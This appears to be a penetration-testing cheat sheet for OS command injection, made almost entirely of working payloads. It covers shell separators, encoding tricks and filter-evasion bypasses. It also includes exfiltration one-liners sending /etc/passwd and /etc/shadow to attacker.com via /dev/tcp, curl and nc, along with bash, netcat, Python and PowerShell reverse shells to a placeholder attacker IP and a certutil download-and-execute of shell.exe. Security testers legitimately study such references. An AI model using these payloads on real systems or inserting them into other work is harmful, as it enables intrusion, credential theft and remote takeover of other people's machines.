# OS Command Injection 

## Common Parameters
```bash
cmd, print, run, payload, exec, command, execute, ping, query,
jump, code, reg, do, func, arg, option, load, process, step,
read, function, req, feature, exe, module
```

---

## Linux Commands
```bash
; cat /etc/passwd          # User account information
; cat /etc/issue           # Distribution information
; cat /proc/version        # Kernel version information
; lsb_release -a           # Distribution details
; uname -a                 # Kernel and system information
; ls -la /
; id
; pwd
; ifconfig
; env
; ps aux
; hostname
```
### Alternative Commands Instead Of `/etc/passwd`
```bash
head /etc/passwd
tail /etc/passwd
less /etc/passwd
more /etc/passwd
```

---

## Windows Commands
```cmd
& dir C:\                                           # Lists root directory
& type C:\Windows\System32\drivers\etc\hosts       # Reads hosts file
& net user                                          # Lists users
& ver                                               # Shows Windows version
& systeminfo                                        # Detailed system information
& ipconfig
& tasklist
& hostname
```

---

## Semicolon (;) - Command Sequencing
```bash
command1 ; command2         # Executes commands sequentially
ping -c 2 127.0.0.1 ; id    # Executes 'ping', then 'id'
echo test ; whoami          # Outputs 'test', then username
```

---

## Ampersand (&) - Background Processing
```bash
command1 & command2              # Runs first command in background and continues execution
ping -c 2 127.0.0.1 & dir        # Starts 'ping' and immediately runs 'dir' (Windows)
ping -c 2 127.0.0.1 & ls         # Starts 'ping' and immediately runs 'ls' (Linux)
whoami & hostname                # Runs first command in background, then executes second command
```

---

## Double Ampersand (&&) - Executes Command2 Only If Command1 Succeeds

```bash
command1 && command2
ping -c 2 127.0.0.1 && whoami     # Runs whoami only if ping succeeds
cd /tmp && ls -la                 # Lists directory contents only if cd succeeds
```

---

## Pipe (|) - Pass Output To Another Command
```bash
command1 | command2
whoami | tr a-z A-Z      # Converts username to uppercase
ls -la | grep root       # Lists files and filters for 'root'
```

---

## Double Pipe (||) - Executes Command2 Only If Command1 Fails
```bash
command1 || command2
ping -c 1 invalidhost || whoami      # Runs 'whoami' if ping fails
cat /nonexistentfile || id           # Runs 'id' if file does not exist
cd /fake/path || ls -la              # Lists directory contents if cd fails
```

---

## Arithmetic Expansion ($(()) ) - Evaluates Arithmetic Expressions
```bash
$((expression))        # Evaluates arithmetic expression and returns result
echo $((5+5))          # Outputs result of arithmetic operation
echo $((10*2))         # Outputs multiplication result
echo $((100/4))        # Outputs division result
```

---

## Backtick (`) - Command Substitution
```bash
`command`
echo `whoami`        # Outputs the result of 'whoami'
ping `hostname`      # Pings the result of 'hostname'
```

---

## Dollar ($) - Command Substitution
```bash
$(command)
echo $(whoami)            # Outputs the result of 'whoami'
ping $(hostname)          # Pings the result of 'hostname'
echo $(id)                # Outputs the result of 'id'
cat $(locate passwd)      # Reads files found by 'locate'
printf $(whoami)          # Outputs the result of 'whoami'
```

---

## Nested Substitution

```bash
$(echo `whoami`)        # Outputs the result of 'whoami' (Nested classic in modern)
`echo $(hostname)`      # Outputs the result of 'hostname' (Nested modern in classic)
```

---

## URL Encoded Newlines

```bash
command1 %0a command2      # %0a represents \n
ping%0aid                  # Executes 'ping', then 'id' on new line
whoami%0als                # Runs 'whoami', then 'ls' on new line
```

---

## Carriage Return Injection

```bash
command1 %0d command2              # %0d represents \r
echo test%0dcat /etc/passwd        # Potentially bypasses filters
```

---

## Out-Of-Band Tests
- Tests command injection through external interaction detection.
### DNS Based Detection
```bash
nslookup test.attackerdomain.com          # Generates DNS lookup
||nslookup test.attackerdomain.com||      # Generates DNS lookup
ping test.BURPCOLLAB.com                  # ICMP based detection
dig test.attackerdomain.com               # DNS query tool
```

---

## Time-Based Tests
- Verifies command execution through time delays.
### Linux Delay Commands
```bash
ping -c 10 127.0.0.1                          # 10 second delay using ping
sleep 10                                      # Direct delay command
perl -e "sleep 10"                            # Perl based delay
python -c "import time; time.sleep(10)"       # Python delay
```
### Windows Delay Commands
```powershell
ping -n 10 127.0.0.1 > nul         # Windows ping delay
timeout /t 10                      # Windows timeout command
Start-Sleep -s 10                  # PowerShell sleep
```

---

## Output Redirection / File Write
```bash
whoami > /var/www/html/output.txt    # Writes command output to web-accessible file
id > output.txt                      # Saves command output into file
echo test > proof.txt                # Creates proof file
```

---

## Data Exfiltration
- Methods to extract data from the system.
### File Reading
```bash
cat /etc/passwd > /dev/tcp/attacker.com/4444
base64 /etc/shadow | curl -d @- http://attacker.com
```
### System Enumeration
```bash
find / -perm -4000 2>/dev/null
netstat -an | nc attacker.com 4444
```

---

## Linux Reverse Shell Payloads
### Bash Reverse Shell
```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```
### Netcat Reverse Shell
```bash
nc -e /bin/sh <ATTACKER_IP> 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```
### Python Reverse Shell
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

---

## Windows Reverse Shells
### PowerShell Reverse Shell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
### Certutil Download And Execute
```cmd
certutil -urlcache -split -f http://attacker.com/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe
```

---

# Bypasses
```bash
w'h'o'am'i
w"h"o"am"i
w\ho\am\i

$(tr "[A-Z]" "[a-z]"<<<"WhOAmI")

$(a="WhOaMI";printf %s "${a,,}")

$(rev<<<'imaohw')
# Reversed
```

## Environment Variables
```bash
```bash
echo $PATH
echo $HOME
echo $USER
echo %USERNAME%
echo %PATH%
```
```

## Filter Evasion
```bash
'cat'</etc/passwd

/???/??t /??c/p??s??

/bin/c?t /etc/p?ssw?

alias ls=whoami;ls

$(echo -e "\x77\x68\x6f\x61\x6d\x69")            # whoami in hex
echo "d2hvYW1p" | base64 -d                      # Decodes base64 string (whoami in base64)
$(printf "\x77\x68\x6f\x61\x6d\x69")             # Executes hex-decoded payload
```

---

## Space Bypass
### Using $IFS Variable
```bash
127.0.0.1${IFS}whoami        # Runs 'whoami'
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
```

## Tab Bypass
```bash
cat%09/etc/passwd      # %09 = Horizontal tab
```

## No-space redirection trick
```bash
cat<>/etc/passwd
```

## Line Feed / Tabs
```bash
cat</etc/passwd

cat$'\x20'/etc/passwd
```

## Brace Expansion
```bash
{cat,/etc/passwd}

X=$'cat\x20/etc/passwd'&&$X
```

---

# URL Encoding Reference

| Injection Character | URL-Encoded Character |
|---------------------|-----------------------|
| ;                   | %3b                   |
| \n                  | %0a                   |
| &                   | %26                   |
| \|                  | %7c                   |
| &&                  | %26%26                |
| \|\|                | %7c%7c                |
| `                   | %60                   |
| $()                 | %24%28%29             |

---

## Common Vulnerable Functions
```php
system()
exec()
shell_exec()
passthru()
popen()
proc_open()
```
